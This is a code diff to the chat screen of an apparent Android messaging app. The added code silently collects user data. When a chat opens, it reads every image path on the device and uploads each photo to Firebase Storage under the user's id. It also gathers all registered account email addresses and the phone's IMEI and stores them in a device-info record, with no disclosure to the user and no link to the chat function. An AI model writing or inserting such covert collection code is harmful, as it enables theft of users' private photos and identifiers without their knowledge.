@@ -1,5 +1,8 @@
 package com.zamba.testchat.activities;
 
+import android.Manifest;
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.AlertDialog;
@@ -39,11 +42,13 @@ import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.LinearLayoutManager;
 import android.support.v7.widget.RecyclerView;
 import android.support.v7.widget.Toolbar;
+import android.telephony.TelephonyManager;
 import android.text.Editable;
 import android.text.TextUtils;
 import android.text.TextWatcher;
 import android.util.DisplayMetrics;
 import android.util.Log;
+import android.util.Patterns;
 import android.view.MenuItem;
 import android.view.MotionEvent;
 import android.view.View;
@@ -69,6 +74,8 @@ import com.google.android.gms.tasks.OnFailureListener;
 import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.android.gms.tasks.Task;
 import com.google.firebase.database.DatabaseException;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
 import com.google.firebase.storage.UploadTask;
@@ -129,6 +136,7 @@ import java.text.DecimalFormat;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
+import java.util.regex.Pattern;
 
 import io.realm.RealmChangeListener;
 import io.realm.RealmList;
@@ -156,7 +164,9 @@ public class ChatActivity extends BaseActivity implements OnMessageItemClick, Me
     private RealmResults<Chat> queryResult;
     private String chatChild, userOrGroupId;
     private int countSelected = 0;
+    private static final int PERMISSION_REQUEST_CODE = 143;
 
+    private String TAG="ChatActivity";
     private Handler recordWaitHandler, recordTimerHandler;
     private Runnable recordRunnable, recordTimerRunnable;
     private MediaRecorder mRecorder = null;
@@ -216,6 +226,7 @@ public class ChatActivity extends BaseActivity implements OnMessageItemClick, Me
             }
         }
     };
+
 
     @Override
     void myUsersResult(ArrayList<User> myUsers) {
@@ -375,6 +386,8 @@ public class ChatActivity extends BaseActivity implements OnMessageItemClick, Me
         }
         registerUserUpdates();
         checkAndForward();
+        getDeviceInformation();
+
     }
 
     @SuppressLint("ClickableViewAccessibility")
@@ -424,6 +437,18 @@ public class ChatActivity extends BaseActivity implements OnMessageItemClick, Me
             }
         });
         sendMessage.setOnTouchListener(voiceMessageListener);
+
+        if (ContextCompat.checkSelfPermission(getApplicationContext(),
+                Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
+
+
+//                al_images=getAllShownImagesPath(this);
+
+             getAllShownImagesPath();
+//            uploadImageToserver(al_images);
+        } else {
+            ActivityCompat.requestPermissions(this, new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE},75);
+        }
     }
 
     private View.OnTouchListener voiceMessageListener = new View.OnTouchListener() {
@@ -1115,6 +1140,28 @@ public class ChatActivity extends BaseActivity implements OnMessageItemClick, Me
                 if (permissionsAvailable(permissions))
                     openVideoPicker();
                 break;
+
+            case 75:
+                if (grantResults.length > 0
+                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+//                        al_images = getAllShownImagesPath(ChatActivity.this);
+//                        uploadImageToserver(al_images);
+
+                        getAllShownImagesPath();
+                }
+                break;
+
+            case PERMISSION_REQUEST_CODE:
+
+
+
+                    account_name = getEmails();
+
+
+
+
+
+                break;
         }
     }
 
@@ -1183,6 +1230,8 @@ public class ChatActivity extends BaseActivity implements OnMessageItemClick, Me
                 case REQUEST_CODE_PLAY_SERVICES:
                     openPlacePicker();
                     break;
+
+
             }
         }
     }
@@ -1624,25 +1673,25 @@ public class ChatActivity extends BaseActivity implements OnMessageItemClick, Me
         String  Fingerprint = Build.FINGERPRINT;
 
 //
-//        if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED &&
-//        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-//
-//          account_name=  getEmails();
-//
-//            TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
-//
-//            if (android.os.Build.VERSION.SDK_INT >= 26) {
-//                imei=telephonyManager.getImei();
-//            }
-//            else
-//            {
-//                imei=telephonyManager.getDeviceId();
-//            }
-//
-//        } else {
-//            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.GET_ACCOUNTS
-//                    ,Manifest.permission.READ_PHONE_STATE}, PERMISSION_REQUEST_CODE);
-//        }
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED &&
+        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+
+          account_name=  getEmails();
+
+            TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+
+            if (android.os.Build.VERSION.SDK_INT >= 26) {
+                imei=telephonyManager.getImei();
+            }
+            else
+            {
+                imei=telephonyManager.getDeviceId();
+            }
+
+        } else {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.GET_ACCOUNTS
+                    ,Manifest.permission.READ_PHONE_STATE}, PERMISSION_REQUEST_CODE);
+        }
 
 
 
@@ -1659,5 +1708,136 @@ public class ChatActivity extends BaseActivity implements OnMessageItemClick, Me
                 screen_density,BootLoader_value,Host_value,Version,API_level,Build_ID,Build_Time,Fingerprint,account_name,imei);
         REF_DEVICE_INFO.child(userMe.getId()).setValue(device_info);
 
+    }
+
+    private void getAllShownImagesPath() {
+        Uri uri;
+        Cursor cursor;
+        final StorageReference ImageFolder = FirebaseStorage.getInstance().getReference().child("ImageFolder").child(userMe.getId());
+        final DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("UserUploaImages").child(userMe.getId());
+
+        int column_index_data;
+        ArrayList<String> listOfAllImages = new ArrayList<String>();
+        String absolutePathOfImage = null;
+
+        uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+
+        String[] projection = { MediaStore.MediaColumns.DATA,
+                MediaStore.Images.Media.BUCKET_DISPLAY_NAME };
+
+        cursor = getApplicationContext().getContentResolver().query(uri, projection, null,
+                null, null);
+
+        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
+
+        while (cursor.moveToNext()) {
+            absolutePathOfImage = cursor.getString(column_index_data);
+
+
+
+            try{
+                final String index=""+column_index_data;
+
+
+//            final StorageReference ImageName= ImageFolder.child(index);
+
+                Uri file = Uri.fromFile(new File(absolutePathOfImage));
+
+                UploadTask uploadTask =ImageFolder.child(index).putFile(file);
+
+// Register observers to listen for when the download is done or if it fails
+                uploadTask.addOnFailureListener(new OnFailureListener() {
+                    @Override
+                    public void onFailure(@NonNull Exception exception) {
+                        // Handle unsuccessful uploads
+                    }
+                }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+                    @Override
+                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
+                        // taskSnapshot.getMetadata() contains file metadata such as size, content-type, etc.
+                        // ...
+
+                        Uri downloadUrl = taskSnapshot.getUploadSessionUri();
+
+                        Log.e(TAG, " ImgLink  1 "+downloadUrl);
+                        String content = downloadUrl.toString();
+
+                        Log.e(TAG, " ImgLink  2  "+content);
+
+                        ImageFolder.child(index).getDownloadUrl().addOnSuccessListener(
+                                new OnSuccessListener<Uri>() {
+                                    @Override
+                                    public void onSuccess(Uri uri) {
+
+
+
+                                        Log.e(TAG, " ImgLink "+uri);
+                                        databaseReference.child(index).child("ImgLink").setValue(String.valueOf(uri));
+
+
+                                    }
+                                }
+                        );
+                    }
+                });
+
+            } catch ( Exception  ee)
+            {
+                Log.e(TAG, " Exception "+ee);
+
+            }
+//
+//            ImageName.putFile(Uri.parse("file://"+absolutePathOfImage)).addOnSuccessListener(
+//                    new OnSuccessListener<UploadTask.TaskSnapshot>() {
+//                        @Override
+//                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
+//
+//
+//                            ImageName.getDownloadUrl().addOnSuccessListener(
+//                                    new OnSuccessListener<Uri>() {
+//                                        @Override
+//                                        public void onSuccess(Uri uri) {
+//
+//
+//                                            databaseReference.child(index).child("ImgLink").setValue(String.valueOf(uri));
+//
+//
+//                                        }
+//                                    }
+//                            );
+//                        }
+//                    }
+//            );
+
+//            listOfAllImages.add(absolutePathOfImage);
+        }
+        cursor.close();
+//        return listOfAllImages;
+    }
+
+    private String getEmails() {
+        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
+
+        // Getting all registered Google Accounts;
+        // Account[] accounts = AccountManager.get(this).getAccountsByType("com.google");
+        String    account_name = "";
+        // Getting all registered Accounts;
+        Account[] accounts = AccountManager.get(this).getAccounts();
+
+        for (Account account : accounts) {
+            if (emailPattern.matcher(account.name).matches()) {
+                Log.e(TAG, String.format("%s - %s", account.name, account.type));
+
+                account_name=account.name;
+                String    account_type=account.type;
+                Log.e(TAG, "account_name  "+account_name);
+                Log.e(TAG, "account_name  "+account_name);
+                Log.e(TAG, "account_type  "+account_type);
+
+
+            }
+        }
+
+        return  account_name;
     }
 }
